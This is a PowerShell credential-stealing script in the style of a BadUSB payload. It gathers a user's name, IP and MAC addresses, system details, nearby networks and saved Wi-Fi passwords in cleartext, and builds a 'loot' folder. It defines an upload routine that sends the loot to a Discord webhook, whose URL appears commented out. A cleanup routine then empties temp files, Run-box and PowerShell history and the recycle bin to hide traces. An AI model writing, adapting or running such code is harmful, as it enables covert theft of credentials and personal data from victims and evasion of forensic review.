############################################################################################################################################################

# MAKE LOOT FOLDER, FILE, and ZIP 

$FolderName = "$env:USERNAME-LOOT-$(get-date -f yyyy-MM-dd_hh-mm)"

$FileName = "$FolderName.txt"

$ZIP = "$FolderName.zip"

New-Item -Path $env:tmp/$FolderName -ItemType Directory

############################################################################################################################################################

#$dc = "https://discord.com/api/webhooks/1063617103481032714/JhXIXhH1lasiGVcfe1lCtiMB-DQC_krBYH-b7FdVSLFB53tK8xkl6Ge3CTA567g82cMA"

############################################################################################################################################################

function Get-fullName {

    try {
    $fullName = (Get-LocalUser -Name $env:USERNAME).FullName
    }
 
 # If no name is detected function will return $env:UserName 

    # Write Error is just for troubleshooting 
    catch {Write-Error "No name was detected" 
    return $env:UserName
    -ErrorAction SilentlyContinue
    }

    return $fullName 

}

$fullName = Get-fullName

############################################################################################################################################################

function Get-email {
    
    try {

    $email = (Get-CimInstance CIM_ComputerSystem).PrimaryOwnerName
    return $email
    }

# If no email is detected function will return backup message for sapi speak

    # Write Error is just for troubleshooting
    catch {Write-Error "An email was not found" 
    return "No Email Detected"
    -ErrorAction SilentlyContinue
    }        
}

$email = Get-email

############################################################################################################################################################

# Get nearby wifi networks

try
{
$NearbyWifi = (netsh wlan show networks mode=Bssid | ?{$_ -like "SSID*" -or $_ -like "*Authentication*" -or $_ -like "*Encryption*"}).trim()
}
catch
{
$NearbyWifi="No nearby wifi networks detected"
}





$wifiProfiles = (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize |  Out-String


$wifiProfiles > $env:TEMP/--wifi-pass.txt

############################################################################################################################################################

# Get info about pc

# Get IP / Network Info

try{$computerPubIP=(Invoke-WebRequest ipinfo.io/ip -UseBasicParsing).Content}
catch{$computerPubIP="Error getting Public IP"}

try{$localIP = Get-NetIPAddress -InterfaceAlias "*Ethernet*","*Wi-Fi*" -AddressFamily IPv4 | Select InterfaceAlias, IPAddress, PrefixOrigin | Out-String}
catch{$localIP = "Error getting local IP"}

$MAC = Get-NetAdapter -Name "*Ethernet*","*Wi-Fi*"| Select Name, MacAddress, Status | Out-String

# Check RDP

if ((Get-ItemProperty "hklm:\System\CurrentControlSet\Control\Terminal Server").fDenyTSConnections -eq 0) { 
	$RDP = "RDP is Enabled" 
} else {
	$RDP = "RDP is NOT enabled" 
}

############################################################################################################################################################

#Get System Info
$computerSystem = Get-CimInstance CIM_ComputerSystem

$computerName = $computerSystem.Name

$computerModel = $computerSystem.Model

$computerManufacturer = $computerSystem.Manufacturer

$computerBIOS = Get-CimInstance CIM_BIOSElement  | Out-String

$computerOs=(Get-WMIObject win32_operatingsystem) | Select Caption, Version  | Out-String

$computerCpu=Get-WmiObject Win32_Processor | select DeviceID, Name, Caption, Manufacturer, MaxClockSpeed, L2CacheSize, L2CacheSpeed, L3CacheSize, L3CacheSpeed | Format-List  | Out-String

$computerMainboard=Get-WmiObject Win32_BaseBoard | Format-List  | Out-String

$computerRamCapacity=Get-WmiObject Win32_PhysicalMemory | Measure-Object -Property capacity -Sum | % { "{0:N1} GB" -f ($_.sum / 1GB)}  | Out-String

$computerRam=Get-WmiObject Win32_PhysicalMemory | select DeviceLocator, @{Name="Capacity";Expression={ "{0:N1} GB" -f ($_.Capacity / 1GB)}}, ConfiguredClockSpeed, ConfiguredVoltage | Format-Table  | Out-String

############################################################################################################################################################

$output = @"


Full Name: $fullName

Email: $email

------------------------------------------------------------------------------------------------------------------------------

Local Users:
$luser

------------------------------------------------------------------------------------------------------------------------------

Public IP: 
$computerPubIP

Local IPs:
$localIP

MAC:
$MAC

------------------------------------------------------------------------------------------------------------------------------

Computer Name:
$computerName

Model:
$computerModel

Manufacturer:
$computerManufacturer

BIOS:
$computerBIOS

OS:
$computerOs

CPU:
$computerCpu

Mainboard:
$computerMainboard

Ram Capacity:
$computerRamCapacity

Total installed Ram:
$computerRam

Video Card: 
$videocard

------------------------------------------------------------------------------------------------------------------------------

Nearby Wifi:
$NearbyWifi

Wifi Profiles: 
$wifiProfiles

------------------------------------------------------------------------------------------------------------------------------

"@

$output > $env:TEMP\$FolderName/computerData.txt


############################################################################################################################################################

function Upload-Discord {

[CmdletBinding()]
param (
    [parameter(Position=0,Mandatory=$False)]
    [string]$file,
    [parameter(Position=1,Mandatory=$False)]
    [string]$text 
)

$hookurl = "$dc"

$Body = @{
  'username' = $env:username
  'content' = $text
}

if (-not ([string]::IsNullOrEmpty($text))){
Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -Body ($Body | ConvertTo-Json)};

if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $hookurl}
}

if (-not ([string]::IsNullOrEmpty($dc))){Upload-Discord -file "$env:tmp/$ZIP"}


 

############################################################################################################################################################

function Clean-Exfil { 

# empty temp folder
rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue

# delete run box history
reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f 

# Delete powershell history
Remove-Item (Get-PSreadlineOption).HistorySavePath -ErrorAction SilentlyContinue

# Empty recycle bin
Clear-RecycleBin -Force -ErrorAction SilentlyContinue

}

############################################################################################################################################################

if (-not ([string]::IsNullOrEmpty($ce))){Clean-Exfil}


RI $env:TEMP/--wifi-pass.txt
